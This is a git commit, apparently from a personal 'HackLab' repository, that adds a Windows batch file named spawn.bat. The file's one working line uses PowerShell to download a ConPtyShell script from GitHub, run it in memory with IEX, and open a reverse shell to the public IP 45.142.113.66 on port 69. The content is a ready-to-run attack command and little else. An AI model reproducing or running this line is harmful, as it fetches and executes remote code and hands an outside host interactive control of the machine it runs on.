d02c54a98dfae502f7098e47304146be2d68f1fb
SebiGHG <59472813+SebiGHG@users.noreply.github.com>
2022-12-13 16:25:42 +0100

    changed

---
+++ WindowsReverseShell/spawn.bat
@@ -0,0 +1,4 @@
+## Creating reverse shell
+## Original link: https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
+
+powershell IEX(IWR https://raw.githubusercontent.com/ItsSebis/HackLab/main/WindowsReverseShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 45.142.113.66 69
